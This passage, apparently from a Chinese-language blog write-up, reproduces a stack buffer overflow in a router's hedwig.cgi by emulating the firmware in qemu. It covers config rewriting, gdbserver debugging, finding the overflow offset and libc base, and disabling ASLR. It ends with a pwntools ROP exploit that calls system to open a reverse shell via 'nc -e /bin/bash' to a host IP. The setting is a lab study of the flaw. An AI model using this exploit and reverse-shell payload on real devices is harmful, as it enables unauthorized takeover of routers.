    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /HNAP1"</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/HNAP1"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/hnap { hnap }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            IndexNames { index.hnap }"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">ssdp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">==</span><span class="token string">"inet6"</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port 1900"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address 239.255.255.250"</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Datagrams On"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/upnp/docs/"</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /htdocs/upnp/ssdpcgi { * }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">upnp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">==</span><span class="token string">"inet6"</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address "</span><span class="token punctuation">.</span><span class="token variable">$ipaddr</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port "</span><span class="token punctuation">.</span><span class="token variable">$port</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/upnp/docs/"</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token string">"/runtime/services/http/server"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$model</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/modelname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ver</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/firmwareversion"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$smart404</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/smart404"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sname</span>    <span class="token operator">=</span> <span class="token string">"Linux, HTTP/1.1, "</span><span class="token punctuation">.</span><span class="token variable">$model</span><span class="token punctuation">.</span><span class="token string">" Ver "</span><span class="token punctuation">.</span><span class="token variable">$ver</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* HTTP server name */</span>
    <span class="token variable">$suname</span> <span class="token operator">=</span> <span class="token string">"Linux, UPnP/1.0, "</span><span class="token punctuation">.</span><span class="token variable">$model</span><span class="token punctuation">.</span><span class="token string">" Ver "</span><span class="token punctuation">.</span><span class="token variable">$ver</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* UPnP server name */</span>
    <span class="token variable">$mode</span>     <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"mode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$inf</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"inf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ifname</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"ifname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ipaddr</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"ipaddr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$port</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hnap</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"hnap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$widget</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"widget"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$af</span>        <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"af"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">!=</span><span class="token string">""</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ifname</span><span class="token operator">!=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span>        <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"HTTP"</span><span class="token punctuation">)</span> <span class="token function">http_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$hnap</span><span class="token punctuation">,</span><span class="token variable">$widget</span><span class="token punctuation">,</span><span class="token variable">$smart404</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span>    <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"SSDP"</span><span class="token punctuation">)</span> <span class="token function">ssdp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span>    <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"UPNP"</span><span class="token punctuation">)</span> <span class="token function">upnp_server</span><span class="token punctuation">(</span><span class="token variable">$suname</span><span class="token punctuation">,</span><span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?&gt;</span></code></pre>
<p>可以了解到该php用于生成配置文件，由于我们只需要其中的http服务，可以按照该配置文件改写我们所需的conf。</p>
<pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
LogGMT On  <span class="token shell-comment comment">#开启log</span>
ErrorLog <span class="token operator">/</span>log <span class="token shell-comment comment">#log文件</span>

Tuning
<span class="token punctuation">{</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">}</span>

Control
<span class="token punctuation">{</span>
    Types
    <span class="token punctuation">{</span>
        text<span class="token operator">/</span>html    <span class="token punctuation">{</span> html htm <span class="token punctuation">}</span>
        text<span class="token operator">/</span>xml    <span class="token punctuation">{</span> xml <span class="token punctuation">}</span>
        text<span class="token operator">/</span>plain    <span class="token punctuation">{</span> txt <span class="token punctuation">}</span>
        image<span class="token operator">/</span>gif    <span class="token punctuation">{</span> gif <span class="token punctuation">}</span>
        image<span class="token operator">/</span>jpeg    <span class="token punctuation">{</span> jpg <span class="token punctuation">}</span>
        text<span class="token operator">/</span>css    <span class="token punctuation">{</span> css <span class="token punctuation">}</span>
        application<span class="token operator">/</span>octet<span class="token operator">-</span>stream <span class="token punctuation">{</span> <span class="token operator">*</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    Specials
    <span class="token punctuation">{</span>
        Dump        <span class="token punctuation">{</span> <span class="token operator">/</span>dump <span class="token punctuation">}</span>
        <span class="token constant">CGI</span>            <span class="token punctuation">{</span> cgi <span class="token punctuation">}</span>
        Imagemap    <span class="token punctuation">{</span> map <span class="token punctuation">}</span>
        Redirect    <span class="token punctuation">{</span> url <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    External
    <span class="token punctuation">{</span>
        <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> php <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


Server
<span class="token punctuation">{</span>
    ServerName <span class="token string">"Linux, HTTP/1.1, "</span>
    ServerId <span class="token string">"1234"</span>
    Family inet
    <span class="token keyword">Interface</span> <span class="token class-name">eth0</span> <span class="token shell-comment comment">#对应qemu虚拟机的网卡</span>
    Address <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">79.143</span> <span class="token shell-comment comment">#对于qemu虚拟机IP</span>
    Port <span class="token string">"1234"</span> <span class="token shell-comment comment">#对应未被使用的端口</span>
    Virtual
    <span class="token punctuation">{</span>
        AnyHost
        Control
        <span class="token punctuation">{</span>
            Alias <span class="token operator">/</span>
            Location <span class="token operator">/</span>htdocs<span class="token operator">/</span>web
            IndexNames <span class="token punctuation">{</span> index<span class="token punctuation">.</span>php <span class="token punctuation">}</span>
            External
            <span class="token punctuation">{</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> router_info<span class="token punctuation">.</span>xml <span class="token punctuation">}</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> post_login<span class="token punctuation">.</span>xml <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        Control
        <span class="token punctuation">{</span>
            Alias <span class="token operator">/</span><span class="token constant">HNAP1</span>
            Location <span class="token operator">/</span>htdocs<span class="token operator">/</span><span class="token constant">HNAP1</span>
            External
            <span class="token punctuation">{</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>hnap <span class="token punctuation">{</span> hnap <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            IndexNames <span class="token punctuation">{</span> index<span class="token punctuation">.</span>hnap <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>接下来利用qemu系统模式仿真路由器的运行环境，具体的配置过程在文章<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>的qemu网络配置中有提到。</p>
<p>利用下面命令启动，接下来的实验是一次性实验，因为会覆盖qemu虚拟机原本文件系统中的/etc等文件夹从而损坏原有配置，所以无法第二次启动。</p>
<pre class=" language-sh"><code class="language-sh">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic</code></pre>
<p>测试能ping通的情况下，将文件系统利用scp命令拷贝到mipsel虚拟机中。</p>
<pre class=" language-sh"><code class="language-sh">sudo scp -r squashfs-root root@192.168.79.143:/root/</code></pre>
<p>之后编写copy.sh脚本配置启动http服务需要的环境包括动态链接库，以及conf配置文件中提到的<code>/usr/sbin/phpcgi</code>，<code>/usr/sbin/hnap</code>。</p>
<p>copy.sh，需要进入squashfs-root目录使用，脚本最后启动了http服务。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
cp conf /
cp sbin/httpd /
cp -rf htdocs/ /
rm /etc/services
cp -rf etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/
cp lib/libcrypt.so.0  /lib/
cp lib/libgcc_s.so  /lib/
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s  /htdocs/cgibin /usr/sbin/hnap
./httpd -f conf</code></pre>
<p>之后可以在浏览器访问conf文件中配置的192.168.79.143:1234/hedwig.cgi</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/hedwigchi%E6%96%87%E4%BB%B6.png" alt=""></p>
<p>或者在宿主机中使用以下命令：其中-v显示详细信息，-X指定什么指令，-H 自定义头信息传递给服务器，-b 指定cookie字符串。</p>
<pre class=" language-sh"><code class="language-sh">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
*   Trying 192.168.79.143...
* Connected to 192.168.79.143 (192.168.79.143) port 1234 (#0)
&gt; POST /hedwig.cgi HTTP/1.1
&gt; Host: 192.168.79.143:1234
&gt; User-Agent: curl/7.47.0
&gt; Accept: */*
&gt; Cookie: uid=zh
&gt; Content-Length: 8
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Server: Linux, HTTP/1.1, 
&lt; Date: Sun, 24 May 2020 01:00:46 GMT
&lt; Transfer-Encoding: chunked
&lt; Content-Type: text/xml
&lt; 
* Connection #0 to host 192.168.79.143 left intact
<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>% </code></pre>
<p>然后在mips虚拟机查看log文件：</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# cat /log
Sun May 24 00:58:11 2020 [1109] *** Mathopd/1.6b9 starting
Sun May 24 00:58:20 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/]
Sun May 24 00:58:43 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/hedwig.cgi]
Sun May 24 00:58:43 2020 [1109] child process 1111 exited with status 255
Sun May 24 00:59:43 2020 [1109] script timeout to 192.168.79.145[52472]
Sun May 24 01:00:46 2020 [1109] process_headers: method[POST], nheaders=[4], URL[/hedwig.cgi]
Sun May 24 01:00:46 2020 [1109] child process 1112 exited with status 255</code></pre>
<p>到这里可以看到我们需要的web服务器以及启动了。</p>
<h2 id="gdbbserver调试"><a href="#gdbbserver调试" class="headerlink" title="gdbbserver调试"></a>gdbbserver调试</h2><p>接下来尝试调试<code>/htdocs/web/hedwig.cgi</code>文件</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
HTTP/1.1 200 OK
Content-Type: text/xml

<hedwig><result>FAILED</result><message>no REQUEST</message></hedwig>root@debian-mipsel:~/squashfs-root#</code></pre>
<p>返回no REQUEST，查看IDA静态反汇编得知没有指定环境变量<code>REQUEST_METHOD</code>的值。所以想要触发漏洞进行调试的话，还是需要通过export 设置相关环境变量。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
HTTP/1.1 200 OK
Content-Type: text/xml
#之前分析过因为没有post数据
<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>
root@debian-mipsel:~/squashfs-root# </code></pre>
<p>使用<code>echo 'uid=1234'| /htdocs/web/hedwig.cgi</code>运行成功。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# echo 'uid=1234'| /htdocs/web/hedwig.cgi 
root@debian-mipsel:~/squashfs-root# </code></pre>
<p>接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。</p>
<p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
<p>可以编写以下脚本进行动态调试</p>
<p>debug.sh，gdbsever 192.168.79.145是宿主机IP，6666是qemu监听端口。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="`cat content`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</code></pre>
<p>宿主机gdb调试</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin
set architecture mips
target remote 192.168.79.143:6666 #对应qemu地址和端口
c</code></pre>
<p>得到溢出地址是0x68423668，利用脚本计算偏移为1009</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gdbseveroffset.png" alt=""></p>
<pre class=" language-sh"><code class="language-sh">#./patternLocOffset.py -s 0x68423668 -l 2000 
[*] Create pattern string contains 2000 characters ok!
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 1009 (adjusted another-endian)
[+] take time: 0.0007 s</code></pre>
<p>接下来是确定libc的基地址，需要先把环境变量配置好，不然/htdocs/web/hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。</p>
<p>利用/htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps ，<strong>a&amp;b 先执行a，在执行b，无论a成功与否都会执行b</strong>。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"

root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
[10] 1052
cat: /proc/pid/maps: No such file or directory
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
[11] 1054
cat: /proc/pid/maps: No such file or directory
[10]+  Stopped                 /htdocs/web/hedwig.cgi
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/1056/maps 
[12] 1056
00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
0042d000-0042f000 rwxp 00000000 00:00 0          [heap]
77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.0
77f92000-77fa1000 ---p 00000000 00:00 0 
77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.0
77fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.0
77fa3000-77fa8000 rw-p 00000000 00:00 0 
77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.1
77fd1000-77fe1000 ---p 00000000 00:00 0 
77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.1
77fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.0
77ff5000-77ff6000 rw-p 00000000 00:00 0 
77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.0
77ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.0
7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]

[11]+  Stopped                 /htdocs/web/hedwig.cgi
root@debian-mipsel:~/squashfs-root#</code></pre>
<h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><p>上面既然用了两种方法：system和sleep(1)，那么下面也使用这两种。</p>
<ol>
<li><p>system方法：将上面的exp的libc基地址和偏移改掉然后cmd换成<code>nc -e /bin/bash 192.168.79.145 9999</code></p>
<pre class=" language-sh"><code class="language-sh">#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"
base_addr = 0x77f34000
system_addr_1 = 0x53200-1
gadget1 = 0x45988
gadget2 = 0x159cc

cmd = 'nc -e /bin/bash 192.168.79.145 9999'
padding = 'A' * 973 #1009-4*9
padding += p32(base_addr + system_addr_1) # s0
padding += p32(base_addr + gadget2)       # s1
padding += 'A' * 4                        # s2
padding += 'A' * 4                        # s3
padding += 'A' * 4                        # s4
padding += 'A' * 4                           # s5
padding += 'A' * 4                        # s6
padding += 'A' * 4                        # s7
padding += 'A' * 4                        # fp
padding += p32(base_addr + gadget1)       # ra
padding += 'B' * 0x10
padding += cmd

f = open("context",'wb')
f.write(padding)
f.close()</code></pre>
<p>生成的context通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="uid=`cat context`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|/htdocs/web/hedwig.cgi
#echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</code></pre>
<p>在mips虚拟机运行之后在本机nc -vlp 9999，确实能够获取/bin/bash权限。成功了！说明rop链构造是没问题的。</p>
